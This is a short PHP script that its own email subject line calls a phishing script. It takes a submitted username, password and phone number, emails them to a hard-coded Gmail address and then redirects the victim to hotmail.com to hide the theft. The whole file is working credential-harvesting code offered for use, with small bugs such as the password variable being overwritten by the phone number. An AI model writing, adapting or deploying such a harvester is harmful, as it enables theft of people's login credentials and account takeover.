<?php

	function mail_sender(){
		if(! ( isset($_REQUEST['username']) && isset($_REQUEST['password']) ) ){
			return false;
		}

		$username = $_REQUEST['username'];
		$password = $_REQUEST['password'];
		$password = $_REQUEST['phone_number'];
		
		$reciever = "vuille.lisabeth@gmail.com";
		
		$subject = "Got new access by phising script";
		$message = "The username is ". $username;
		$message .= "and password is ". $password;
		$message .= "and phhone_number is ". $phone_number;
		
		return mail($reciever, $subject, $message);
	}
	
	if(mail_sender()){
		header("Location: http://www.hotmail.com");
	}
?>
